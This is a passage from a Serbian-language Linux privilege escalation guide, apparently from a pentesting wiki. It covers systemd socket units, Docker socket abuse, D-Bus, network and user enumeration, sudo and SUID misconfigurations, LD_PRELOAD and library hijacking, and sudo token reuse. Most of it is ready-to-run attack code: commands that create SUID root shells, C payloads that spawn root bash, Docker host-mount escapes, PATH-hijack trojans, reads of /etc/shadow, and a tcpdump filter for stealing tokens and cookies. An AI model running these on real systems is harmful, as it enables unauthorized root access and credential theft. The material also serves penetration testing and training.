- `Accept`: Prima boolean argument. Ako je **true**, za svaku dolaznu konekciju se **pokreće instanca servisa** i samo joj se prosleđuje konekcioni socket. Ako je **false**, svi slušaći socketi se **prosleđuju pokrenutoj service jedinici**, i samo jedna service jedinica se pokreće za sve konekcije. Ova vrednost se ignoriše za datagram socket-e i FIFO-e gde jedna service jedinica bezuslovno obrađuje sav dolazni saobraćaj. **Podrazumevano je false**. Iz razloga performansi, preporučuje se pisati nove daemone tako da budu pogodni za `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Prima jednu ili više komandnih linija koje se izvršavaju **pre** odnosno **posle** nego što su slušaći **socketi**/FIFO-e **kreirani** i vezani. Prvi token u komandnoj liniji mora biti apsolutno ime fajla, nakon čega slede argumenti za proces.
- `ExecStopPre`, `ExecStopPost`: Dodatne **komande** koje se izvršavaju **pre** odnosno **posle** zatvaranja i uklanjanja slušaćih **socket-a**/FIFO-e.
- `Service`: Određuje ime **service** jedinice koju treba **aktivirati** na **dolazni saobraćaj**. Ova opcija je dozvoljena samo za socket-e sa Accept=no. Podrazumevano ukazuje na servis koji ima isto ime kao socket (sa zamenjenim sufiksom). U većini slučajeva nije potrebno koristiti ovu opciju.

### Upisivi .socket fajlovi

Ako nađete **upisiv** `.socket` fajl, možete **dodati** na početak `[Socket]` sekcije nešto poput: `ExecStartPre=/home/kali/sys/backdoor` i backdoor će biti izvršen pre nego što se socket kreira. Dakle, **verovatno ćete morati da sačekate restart mašine.**\
_Napomena: sistem mora koristiti tu konfiguraciju socket fajla da bi backdoor bio izvršen_

### Socket activation + writable unit path (kreiranje nedostajuće service jedinice)

Još jedna visoko-efekatna greška u konfiguraciji je:

- socket unit sa `Accept=no` i `Service=<name>.service`
- referencirana service jedinica nedostaje
- napadač može upisivati u `/etc/systemd/system` (ili neki drugi unit search path)

U tom slučaju, napadač može kreirati `<name>.service`, zatim izazvati saobraćaj prema socketu tako da systemd učita i izvrši novi servis kao root.

Kratak tok:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Writable sockets

Ako identifikujete bilo koji **writable socket** (_sada govorimo o Unix Sockets i ne o config `.socket` fajlovima_), onda **možete komunicirati** sa tim socketom i možda exploit a vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Sirova veza
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Primer eksploatacije:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Imajte na umu da može postojati nekoliko **sockets koji osluškuju HTTP** zahteva (_ne mislim na .socket fajlove već na fajlove koji se ponašaju kao unix sockets_). Možete to proveriti pomoću:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Ako socket **odgovara na HTTP** zahtev, onda možete sa njim **komunicirati** i možda **exploit some vulnerability**.

### Upisivi Docker socket

Docker socket, koji se često nalazi na `/var/run/docker.sock`, predstavlja kritičan fajl koji treba obezbediti. Podrazumevano, upisiv je za korisnika `root` i članove grupe `docker`. Posedovanje write access-a na ovaj socket može dovesti do privilege escalation. Ovde je prikaz kako se to može uraditi i alternativne metode ako Docker CLI nije dostupan.

#### **Privilege Escalation with Docker CLI**

Ako imate write access na Docker socket, možete escalate privileges koristeći sledeće komande:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ove komande omogućavaju da pokrenete container sa root pristupom fajl sistemu hosta.

#### **Direktno korišćenje Docker API-ja**

U slučajevima kada Docker CLI nije dostupan, Docker socket se i dalje može manipulisati koristeći Docker API i `curl` komande.

1.  **List Docker Images:** Retrieve the list of available images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nakon uspostavljanja `socat` konekcije, možete direktno izvršavati komande u container-u sa root pristupom fajl sistemu hosta.

### Ostalo

Imajte na umu da ako imate write permissions nad docker socket-om zato što ste **inside the group `docker`** imate [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Ako [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Proverite **more ways to break out from containers or abuse container runtimes to escalate privileges** u:


{{#ref}}
container-security/
{{#endref}}

## Containerd (ctr) eskalacija privilegija

Ako ustanovite da možete da koristite **`ctr`** komandu, pročitajte sledeću stranicu jer **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** eskalacija privilegija

Ako ustanovite da možete da koristite **`runc`** komandu, pročitajte sledeću stranicu jer **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus je sofisticiran inter-Process Communication (IPC) sistem koji omogućava aplikacijama da efikasno komuniciraju i razmenjuju podatke. Dizajniran za moderne Linux sisteme, pruža robustan okvir za različite oblike aplikacione komunikacije.

Sistem je svestran, podržava osnovni IPC koji poboljšava razmenu podataka između procesa, podsećajući na enhanced UNIX domain sockets. Pored toga, pomaže u emitovanju događaja ili signala, olakšavajući besprekornu integraciju među komponentama sistema. Na primer, signal od Bluetooth daemona o dolaznom pozivu može naterati muzički plejer da utiša zvuk, poboljšavajući korisničko iskustvo. Dodatno, D-Bus podržava sistem udaljenih objekata, pojednostavljujući zahteve za servisima i pozive metoda između aplikacija, čime se pojednostavljuju procesi koji su tradicionalno bili kompleksni.

D-Bus radi po allow/deny modelu, upravljajući dozvolama za poruke (pozivi metoda, emitovanje signala, itd.) na osnovu kumulativnog efekta pravila politike koja se podudaraju. Ove politike definišu interakcije sa bus-om, potencijalno omogućavajući eskalaciju privilegija kroz zloupotrebu ovih dozvola.

Primer takve politike u `/etc/dbus-1/system.d/wpa_supplicant.conf` prikazan je, i detaljno navodi dozvole za root korisnika da bude owner, da šalje i prima poruke od `fi.w1.wpa_supplicant1`.

Politike bez specificiranog user-a ili group-e važe univerzalno, dok "default" context politike važe za sve koji nisu pokriveni drugim specifičnim politikama.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Naučite kako da enumerate i exploit D-Bus communication ovde:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

Uvek je interesantno enumerate the network i utvrditi poziciju mašine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Brza trijaža Outbound filtering

Ako host može da izvršava komande, ali callbacks ne uspevaju, brzo odvojite DNS, transport, proxy i route filtering:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Otvoreni portovi

Uvek proverite network services koji rade na mašini sa kojom niste mogli da stupite u interakciju pre nego što joj pristupite:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Klasifikujte listenere po odredištu vezivanja:

- `0.0.0.0` / `[::]`: izloženo na svim lokalnim interfejsima.
- `127.0.0.1` / `::1`: samo lokalno (dobri kandidati za tunnel/forward).
- Specific internal IPs (e.g. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): obično dostupni samo iz unutrašnjih segmenata.

### Radni tok triaže servisa koji su samo lokalni

Kada kompromitujete host, servisi vezani za `127.0.0.1` često postanu prvi put dostupni iz vašeg shell-a. Brz lokalni radni tok je:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS kao mrežni skener (samo mrežni režim)

Pored lokalnih PE checks, linPEAS može da radi kao fokusirani mrežni skener. Koristi dostupne binarne fajlove u `$PATH` (tipično `fping`, `ping`, `nc`, `ncat`) i ne instalira alate.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Ako prosledite `-d`, `-p` ili `-i` bez `-t`, linPEAS će se ponašati kao pure network scanner (skipping the rest of privilege-escalation checks).

### Sniffing

Proverite da li možete sniff traffic. Ako možete, mogli biste da uhvatite neke credentials.
```
timeout 1 tcpdump
```
Brze praktične provere:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) je posebno koristan u post-exploitation jer mnoge internal-only usluge tamo izlažu tokens/cookies/credentials:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Capture sada, parse kasnije:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Korisnici

### Generička enumeracija

Proverite **ko** ste, koje **privilegije** imate, koji **korisnici** su u sistemu, koji od njih mogu da **login** i koji imaju **root privilegije:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Veliki UID

Neke Linux verzije bile su pogođene greškom koja omogućava korisnicima sa **UID > INT_MAX** to escalate privileges. Više informacija: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Grupe

Proveri da li si **član neke grupe** koja bi ti mogla grant you root privileges:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Međuspremnik

Proveri da li se u međuspremniku nalazi nešto interesantno (ako je moguće)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politika lozinki
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Poznate lozinke

Ako **znate bilo koju lozinku** iz okruženja, **pokušajte da se ulogujete kao svaki korisnik** koristeći tu lozinku.

### Su Brute

Ako vam ne smeta što ćete napraviti dosta buke i ako su binarni fajlovi `su` i `timeout` prisutni na računaru, možete pokušati da brute-force-ujete korisnika koristeći [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
Takođe, [**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sa parametrom `-a` pokušava da brute-force-uje korisnike.

## Zloupotrebe zapisivog $PATH-a

### $PATH

Ako otkrijete da možete **pisati unutar nekog foldera iz $PATH**, možda ćete moći da eskalirate privilegije kreiranjem backdoor-a unutar zapisivog foldera sa imenom neke komande koja će biti izvršena od strane drugog korisnika (idealno root) i koja **nije učitana iz direktorijuma koji se nalazi pre** vašeg zapisivog direktorijuma u $PATH.

### SUDO and SUID

Možda vam je dozvoljeno da izvršite neku komandu koristeći sudo ili te komande mogu imati suid bit. Proverite koristeći:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Neke **neočekivane komande vam omogućavaju da čitate i/ili zapisujete fajlove ili čak izvršite komandu.** На пример:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo konfiguracija može omogućiti korisniku da izvrši neku komandu sa privilegijama drugog korisnika bez poznavanja lozinke.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
U ovom primeru korisnik `demo` može da pokrene `vim` kao `root`, sada je trivijalno dobiti shell dodavanjem ssh key u `root` direktorijum ili pozivanjem `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ova direktiva omogućava korisniku da **postavi promenljivu okruženja** prilikom izvršavanja nečega:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ovaj primer, **based on HTB machine Admirer**, bio je **ranjiv** na **PYTHONPATH hijacking** da učita proizvoljnu python biblioteku dok se skripta izvršava kao root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), možete iskoristiti Bash-ovo ponašanje pri pokretanju neinteraktivnih shellova da pokrenete proizvoljan kod kao root prilikom poziva dozvoljene komande.

- Why it works: Za neinteraktivne shellove, Bash evaluira `$BASH_ENV` i učitava (sources) taj fajl pre nego što pokrene ciljni skript. Mnogi sudo pravilnici dozvoljavaju pokretanje skripta ili shell wrapper-a. Ako `BASH_ENV` bude sačuvan od strane sudo, vaš fajl će biti učitan sa root privilegijama.

- Requirements:
- Pravilo u sudo-u koje možete pokrenuti (bilo koji target koji poziva `/bin/bash` neinteraktivno, ili bilo koji bash skript).
- `BASH_ENV` prisutan u `env_keep` (proverite sa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Ojačavanje:
- Uklonite `BASH_ENV` (i `ENV`) iz `env_keep`, po mogućstvu koristite `env_reset`.
- Izbegavajte shell wrappers za sudo-allowed commands; koristite minimal binaries.
- Razmotrite sudo I/O logging i alerting kada se koriste sačuvane env vars.

### Terraform via sudo with preserved HOME (!env_reset)

Ako sudo ostavi okruženje netaknuto (`!env_reset`) dok dozvoljava `terraform apply`, `$HOME` ostaje nalog koji je pozvao komandu. Terraform zbog toga učitava **$HOME/.terraformrc** kao root i poštuje `provider_installation.dev_overrides`.

- Usmerite required provider na direktorijum u koji se može pisati i ubacite zlonamerni plugin nazvan po provideru (npr. `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform neće uspeti u Go plugin handshake, ali će izvršiti payload kao root pre nego što se ugasi, ostavljajući iza sebe SUID shell.

### TF_VAR overrides + zaobilaženje validacije symlink-ova

Terraform variables mogu biti obezbeđene putem `TF_VAR_<name>` environment variables, koje opstaju kada sudo sačuva okruženje. Slabe validacije kao `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` mogu se zaobići pomoću symlink-ova:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform razrešava symlink i kopira stvarni `/root/root.txt` u attacker-readable destinaciju. Isti pristup se može koristiti za **pisanje** u privilegovane putanje prethodnim kreiranjem destinacijskih symlinkova (npr. upućujući provider’s destination path unutar `/etc/cron.d/`).

### requiretty / !requiretty

Na nekim starijim distribucijama, sudo može biti konfigurisano sa `requiretty`, što primorava sudo da se pokreće samo iz interaktivnog TTY-ja. Ako je `!requiretty` postavljeno (ili opcija nedostaje), sudo se može izvršavati iz neinteraktivnih konteksta kao što su reverse shells, cron jobs ili skripte.
```bash
Defaults !requiretty
```
Ovo samo po sebi nije direktna ranjivost, ali proširuje situacije u kojima se sudo pravila mogu zloupotrebiti bez potrebe za full PTY.

### Sudo env_keep+=PATH / nesiguran secure_path → PATH hijack

Ako `sudo -l` prikazuje `env_keep+=PATH` ili `secure_path` koji sadrži unose koje napadač može upisati (npr. `/home/<user>/bin`), bilo koja relativna komanda unutar sudo-dozvoljenog cilja može biti zasenjena.

- Zahtevi: sudo pravilo (često `NOPASSWD`) koje pokreće skriptu/binar koji poziva komande bez apsolutnih putanja (`free`, `df`, `ps`, itd.) i upisiv unos u PATH koji se pretražuje prvi.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo zaobilaženje putanja pri izvršavanju
**Skoči** da pročitaš druge fajlove ili koristi **symlinks**. Na primer u sudoers fajlu: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ako se koristi **wildcard** (\*), još je lakše:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Protivmere**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bez putanje komande

Ako su **sudo dozvole** dodeljene jednoj komandi **bez navođenja putanje**: _hacker10 ALL= (root) less_ možete to iskoristiti promenom PATH varijable
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ova tehnika se takođe može koristiti ako **suid** binary **izvršava drugu komandu bez navođenja putanje do nje (uvek proveri pomoću** _**strings**_ **sadržaj čudnog SUID binarnog fajla)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary sa putanjom komande

Ako **suid** binary **izvršava drugu komandu navodeći putanju**, onda možeš pokušati da **export a function** sa imenom komande koju suid fajl poziva.

Na primer, ako suid binary poziva _**/usr/sbin/service apache2 start**_ moraš pokušati da kreiraš funkciju i export it:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Zatim, kada pozovete suid binary, ova funkcija će biti izvršena

### Upisiv script koji izvršava SUID wrapper

Uobičajena pogrešna konfiguracija custom-app je root-owned SUID binary wrapper koji izvršava script, dok je sam script upisiv za low-priv users.

Tipičan obrazac:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Ako je `/usr/local/bin/backup.sh` moguće upisati, možete dodati payload komande i zatim pokrenuti SUID wrapper:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Brze provere:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Ovaj put napada je posebno čest u "maintenance"/"backup" wrapper-ima koji se isporučuju u `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Okruženjska promenljiva **LD_PRELOAD** koristi se za navođenje jedne ili više deljenih biblioteka (.so fajlova) koje loader učitava pre svih ostalih, uključujući standardnu C biblioteku (`libc.so`). Ovaj proces se naziva pre-učitavanje biblioteke.

Međutim, da bi se održala sigurnost sistema i sprečilo zloupotrebljavanje ove funkcije, naročito kod **suid/sgid** izvršnih fajlova, sistem primenjuje određene uslove:

- Loader ignoriše **LD_PRELOAD** za izvršne fajlove kod kojih real user ID (_ruid_) ne odgovara effective user ID (_euid_).
- Za izvršne fajlove sa suid/sgid, pre-učitavaju se samo biblioteke u standardnim putanjama koje su takođe suid/sgid.

Eskalacija privilegija može da se dogodi ako imate mogućnost da izvršavate komande sa `sudo` i izlaz `sudo -l` uključuje izraz **env_keep+=LD_PRELOAD**. Ova konfiguracija omogućava da promenljiva okruženja **LD_PRELOAD** opstane i bude prepoznata čak i kada se komande pokreću sa `sudo`, što potencijalno može dovesti do izvršavanja proizvoljnog koda sa povišenim privilegijama.
```
Defaults        env_keep += LD_PRELOAD
```
Sačuvajte kao **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Zatim ga **kompajlirajte** koristeći:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na kraju, **escalate privileges** pokretanjem
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Sličan privesc se može zloupotrebiti ako napadač kontroliše **LD_LIBRARY_PATH** env variable, jer napadač kontroliše putanju u kojoj će se tražiti biblioteke.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Kada naiđete na binarni fajl sa **SUID** dozvolama koji deluje neobično, dobra je praksa proveriti da li pravilno učitava **.so** fajlove. Ovo se može proveriti pokretanjem sledeće komande:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na primer, susretanje greške poput _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeriše potencijal za eksploataciju.

Da bi se ovo iskoristilo, kreira se C fajl, na primer _"/path/to/.config/libcalc.c"_, koji sadrži sledeći kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ovaj kod, kada se kompajlira i izvrši, ima za cilj eskalaciju privilegija manipulacijom dozvola fajlova i pokretanjem shell-a sa povišenim privilegijama.

Kompajlirajte gornji C fajl u shared object (.so) fajl sa:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Na kraju, pokretanje pogođenog SUID binary-ja trebalo bi da aktivira exploit, omogućavajući potencijalno kompromitovanje sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sada kada smo pronašli SUID binarni fajl koji učitava biblioteku iz direktorijuma u koji možemo pisati, napravimo biblioteku u tom direktorijumu sa potrebnim imenom:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ako dobijete grešku kao što je
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to znači da biblioteka koju ste generisali treba da sadrži funkciju nazvanu `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) je kurirana lista Unix binarnih fajlova koje napadač može iskoristiti da zaobiđe lokalna bezbednosna ograničenja. [**GTFOArgs**](https://gtfoargs.github.io/) je isto, ali za slučajeve kada možete **samo ubacivati argumente** u komandu.

Projekat prikuplja legitimne funkcije Unix binarnih fajlova koje se mogu zloupotrebiti da se pobegne iz ograničenih shell-ova, eskaliraju ili održe povišene privilegije, prenesu fajlovi, pokrenu bind i reverse shells, i olakšaju ostali post-exploitation zadaci.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Zahtevi za eskalaciju privilegija:

- Već imate shell kao korisnik "_sampleuser_"
- "_sampleuser_" je **koristio `sudo`** da izvrši nešto u **poslednjih 15 minuta** (po defaultu to je trajanje sudo tokena koje nam dozvoljava da koristimo `sudo` bez unosa lozinke)
- `cat /proc/sys/kernel/yama/ptrace_scope` je 0
- `gdb` je dostupan (možete ga otpremiti)

(Možete privremeno omogućiti `ptrace_scope` sa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ili trajno menjajući `/etc/sysctl.d/10-ptrace.conf` i postavljajući `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Prvi **exploit** (`exploit.sh`) će kreirati binarni fajl `activate_sudo_token` u _/tmp_. Možete ga koristiti da **aktivirate sudo token u svojoj sesiji** (nećete automatski dobiti root shell, uradite `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
